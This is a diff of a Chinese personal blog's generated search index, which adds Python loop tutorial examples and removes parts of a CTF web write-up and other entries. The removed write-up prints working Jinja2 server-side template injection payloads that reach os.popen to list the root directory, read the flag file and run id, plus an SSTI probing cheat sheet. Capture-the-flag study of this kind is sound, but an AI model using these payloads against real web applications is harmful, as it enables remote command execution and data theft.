+<p>下面我们通过一个“猜数字”的小游戏来看看如何使用<code>while</code>循环。猜数字游戏的规则是：计算机出一个1到100之间的随机数，玩家输入自己猜的数字，计算机给出对应的提示信息（大一点、小一点或猜对了），如果玩家猜中了数字，计算机提示用户一共猜了多少次，游戏结束，否则游戏继续。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">猜数字游戏</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Version: 0.1</span></span><br><span class="line"><span class="string">Author: 骆昊</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 产生一个1-100范围的随机数</span></span><br><span class="line">answer = random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    counter += <span class="number">1</span></span><br><span class="line">    number = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入: &#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> number &lt; answer:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;大一点&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> number &gt; answer:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;小一点&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;恭喜你猜对了!&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 当退出while循环的时候显示用户一共猜了多少次</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;你总共猜了<span class="subst">&#123;counter&#125;</span>次&#x27;</span>)</span><br></pre></td></tr></table></figure>
 <p><img src="/.io//3.png" alt="3"></p>
-<h1><strong>0X02 直接用ssti日就对了！🤠</strong></h1>
-<ul>
-<li><em>查看根目录</em></li>
-</ul>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="/.io//4.png" alt="4"></p>
-<p>ls后台文件出现flag</p>
-<ul>
-<li><em>构造playload，查看flag</em></li>
-</ul>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">P3<span class="string">&#x27;s girlfirend is : flag&#123;4d59689e-7751-4ee4-8daa-f4d8c8de99e2&#125;</span></span><br></pre></td></tr></table></figure>
-<h1><strong>SSTI学习🇭🇺</strong></h1>
-<p>像上面的题目的套路一般直接找playload注入</p>
-<ul>
-<li>
-<h2 id="常用playload">常用playload:</h2>
-</li>
-</ul>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">命令执行：&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; </span><br><span class="line"></span><br><span class="line">文件操作：&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="萌新入门ssti必看"><em>萌新入门ssti必看</em></h2>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">测试是否存在ssti注入 &#123;&#123;<span class="number">1</span>+<span class="number">1</span>&#125;&#125;  <span class="meta">#回复页面为2说明存在ssti注入</span></span><br><span class="line">查询： &#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__&#125;&#125; </span><br><span class="line">查看可用模块： &#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()&#125;&#125; </span><br><span class="line">查找危险函数： &#123;&#123;().__class__.base__.__subclasses__().index(warnings.catch_warnings)&#125;&#125;</span><br><span class="line"></span><br><span class="line">相关函数解释</span><br><span class="line">__class__ 返回类型所属的对象</span><br><span class="line"></span><br><span class="line">__subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line"></span><br><span class="line">__init__ 类的初始化方法</span><br><span class="line"></span><br><span class="line">__globals__ 对包含函数全局变量的字典的引用</span><br><span class="line"></span><br><span class="line">__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line"></span><br><span class="line">__bases__ 返回该对象所继承的基类 __builtins__是做为默认初始模块</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="break和continue">break和continue</h2>
+<p>上面的代码中使用<code>while True</code>构造了一个条件恒成立的循环，也就意味着如果不做特殊处理，循环是不会结束的，这也就是常说的“死循环”。为了在用户猜中数字时能够退出循环结构，我们使用了<code>break</code>关键字，它的作用是提前结束循环。需要注意的是，<code>break</code>只能终止它所在的那个循环，这一点在使用嵌套循环结构时需要引起注意，下面的例子我们会讲到什么是嵌套的循环结构。除了<code>break</code>之外，还有另一个关键字是<code>continue</code>，它可以用来放弃本次循环后续的代码直接让循环进入下一轮。</p>
+<hr>
+<h2 id="嵌套的循环结构">嵌套的循环结构</h2>
+<p>和分支结构一样，循环结构也是可以嵌套的，也就是说在循环中还可以构造循环结构。下面的例子演示了如何通过嵌套的循环来输出一个乘法口诀表（九九表）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">打印乘法口诀表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Version: 0.1</span></span><br><span class="line"><span class="string">Author: 骆昊</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i + <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>*<span class="subst">&#123;j&#125;</span>=<span class="subst">&#123;i * j&#125;</span>&#x27;</span>, end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>
+<p>很显然，在上面的代码中，外层循环用来控制一共会产生9行的输出，而内层循环用来控制每一行会输出多少列。内层循环中的输出就是九九表一行中的所有列，所以在内层循环完成时，有一个<code>print()</code>来实现换行输出的效果。</p>
+<hr>
+<h2 id="循环的例子">循环的例子</h2>
+<h3 id="例子1：输入一个正整数判断它是不是素数。">例子1：输入一个正整数判断它是不是素数。</h3>
+<blockquote>
+<p><strong>提示</strong>：素数指的是只能被1和自身整除的大于1的整数。</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">输入一个正整数判断它是不是素数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Version: 0.1</span></span><br><span class="line"><span class="string">Author: 骆昊</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入一个正整数: &#x27;</span>))</span><br><span class="line">end = <span class="built_in">int</span>(num ** <span class="number">0.5</span>)</span><br><span class="line">is_prime = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, end + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> num % x == <span class="number">0</span>:</span><br><span class="line">        is_prime = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> is_prime <span class="keyword">and</span> num != <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;num&#125;</span>是素数&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;num&#125;</span>不是素数&#x27;</span>)</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>WEB</category>
+        <category>python学习</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
-        <tag>WEB</tag>
-        <tag>SSTI注入</tag>
+        <tag>python</tag>
       </tags>
   </entry>
   <entry>
@@ -725,56 +774,6 @@ IDA先在sub_40207B()函数执行后一条下断点</p>
       </tags>
   </entry>
   <entry>
-    <title>从零开始学python第二天</title>
-    <url>/2021/04/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
-    <content><![CDATA[<blockquote>
-<p>从零考试学习python内容 99%来自于python大神 python-jack的<a href="https://zhuanlan.zhihu.com/p/113640664">知乎文章  </a> 再结合本人的实际情况进行学习，严格来说这是JACK老师的内容，只不过再此基础上，我增添了一些我在CTF解题过程中遇到的python脚本实际情况，再次感谢JACK老师</p>
-<p>学习的内容来自：<a href="https://zhuanlan.zhihu.com/p/121188620">https://zhuanlan.zhihu.com/p/121188620</a></p>
-</blockquote>
-<hr>
-<h2 id="for-in循环">for-in循环</h2>
-<p>如果明确的知道循环执行的次数，我们推荐使用<code>for-in</code>循环，例如计算1到100的和。 被<code>for-in</code>循环控制的语句块也是通过缩进的方式来确定的，这一点跟分支结构完全相同，大家看看下面的代码就明白了。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">用for循环实现1~100求和</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Version: 0.1</span></span><br><span class="line"><span class="string">Author: 骆昊</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">total = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">    total += x</span><br><span class="line"><span class="built_in">print</span>(total)</span><br></pre></td></tr></table></figure>
-<p><img src="/.io//0.png" alt="0"></p>
-<p>需要说明的是上面代码中的<code>range(1, 101)</code>可以用来构造一个从1到100的范围，当我们把这样一个范围放到<code>for-in</code>循环中，就可以通过前面的循环变量<code>x</code>依次取出从1到100的整数。当然，<code>range</code>的用法非常灵活，下面给出了一个例子：</p>
-<ul>
-<li><code>range(101)</code>：可以用来产生0到100范围的整数，需要注意的是取不到101。</li>
-<li><code>range(1, 101)</code>：可以用来产生1到100范围的整数，相当于前面是闭区间后面是开区间。</li>
-<li><code>range(1, 101, 2)</code>：可以用来产生1到100的奇数，其中2是步长，即每次数值递增的值。</li>
-<li><code>range(100, 0, -2)</code>：可以用来产生100到1的偶数，其中-2是步长，即每次数字递减的值。</li>
-</ul>
-<p>知道了这一点，我们可以用下面的代码来实现1~100之间的偶数求和。</p>
-<p><img src="/.io//1.png" alt="1"></p>
-<hr>
-<h2 id="while循环">while循环</h2>
-<p>如果要构造不知道具体循环次数的循环结构，我们推荐使用<code>while</code>循环。<code>while</code>循环通过一个能够产生或转换出<code>bool</code>值的表达式来控制循环，表达式的值为<code>True</code>则继续循环；表达式的值为<code>False</code>则结束循环。</p>
-<p>下面我们通过一个“猜数字”的小游戏来看看如何使用<code>while</code>循环。猜数字游戏的规则是：计算机出一个1到100之间的随机数，玩家输入自己猜的数字，计算机给出对应的提示信息（大一点、小一点或猜对了），如果玩家猜中了数字，计算机提示用户一共猜了多少次，游戏结束，否则游戏继续。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">猜数字游戏</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Version: 0.1</span></span><br><span class="line"><span class="string">Author: 骆昊</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 产生一个1-100范围的随机数</span></span><br><span class="line">answer = random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    counter += <span class="number">1</span></span><br><span class="line">    number = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入: &#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> number &lt; answer:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;大一点&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> number &gt; answer:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;小一点&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;恭喜你猜对了!&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 当退出while循环的时候显示用户一共猜了多少次</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;你总共猜了<span class="subst">&#123;counter&#125;</span>次&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p><img src="/.io//3.png" alt="3"></p>
-<hr>
-<h2 id="break和continue">break和continue</h2>
-<p>上面的代码中使用<code>while True</code>构造了一个条件恒成立的循环，也就意味着如果不做特殊处理，循环是不会结束的，这也就是常说的“死循环”。为了在用户猜中数字时能够退出循环结构，我们使用了<code>break</code>关键字，它的作用是提前结束循环。需要注意的是，<code>break</code>只能终止它所在的那个循环，这一点在使用嵌套循环结构时需要引起注意，下面的例子我们会讲到什么是嵌套的循环结构。除了<code>break</code>之外，还有另一个关键字是<code>continue</code>，它可以用来放弃本次循环后续的代码直接让循环进入下一轮。</p>
-<hr>
-<h2 id="嵌套的循环结构">嵌套的循环结构</h2>
-<p>和分支结构一样，循环结构也是可以嵌套的，也就是说在循环中还可以构造循环结构。下面的例子演示了如何通过嵌套的循环来输出一个乘法口诀表（九九表）</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">打印乘法口诀表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Version: 0.1</span></span><br><span class="line"><span class="string">Author: 骆昊</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i + <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>*<span class="subst">&#123;j&#125;</span>=<span class="subst">&#123;i * j&#125;</span>&#x27;</span>, end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>
-<p>很显然，在上面的代码中，外层循环用来控制一共会产生9行的输出，而内层循环用来控制每一行会输出多少列。内层循环中的输出就是九九表一行中的所有列，所以在内层循环完成时，有一个<code>print()</code>来实现换行输出的效果。</p>
-<hr>
-<h2 id="循环的例子">循环的例子</h2>
-<h3 id="例子1：输入一个正整数判断它是不是素数。">例子1：输入一个正整数判断它是不是素数。</h3>
-<blockquote>
-<p><strong>提示</strong>：素数指的是只能被1和自身整除的大于1的整数。</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">输入一个正整数判断它是不是素数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Version: 0.1</span></span><br><span class="line"><span class="string">Author: 骆昊</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入一个正整数: &#x27;</span>))</span><br><span class="line">end = <span class="built_in">int</span>(num ** <span class="number">0.5</span>)</span><br><span class="line">is_prime = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, end + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> num % x == <span class="number">0</span>:</span><br><span class="line">        is_prime = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> is_prime <span class="keyword">and</span> num != <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;num&#125;</span>是素数&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;num&#125;</span>不是素数&#x27;</span>)</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>python学习</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>总结一下最近学习状况</title>
     <url>/2021/04/11/%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B%E6%9C%80%E8%BF%91%E5%AD%A6%E4%B9%A0%E7%8A%B6%E5%86%B5/</url>
     <content><![CDATA[<p>看了一下最近自己博客更新速度（大二）和自己打比赛的状况，三个字来概括就是“很差劲”。打比赛很多题还是不会，感觉真的没有在认真学，内心非常浮躁，没有对紧迫时间的敬畏。真的必须规定自己每天至少一道web或者python，总结题目的时间至少在两个小时以上才行</p>
@@ -786,12 +785,6 @@ IDA先在sub_40207B()函数执行后一条下断点</p>
         <tag>CTF</tag>
         <tag>杂谈</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>test</title>
-    <url>/2021/04/19/test/</url>
-    <content><![CDATA[<p><img src="/.io//1.jpg" alt="1"></p>
-]]></content>
   </entry>
   <entry>
     <title>DDCTF 2019 homebrew event loop</title>
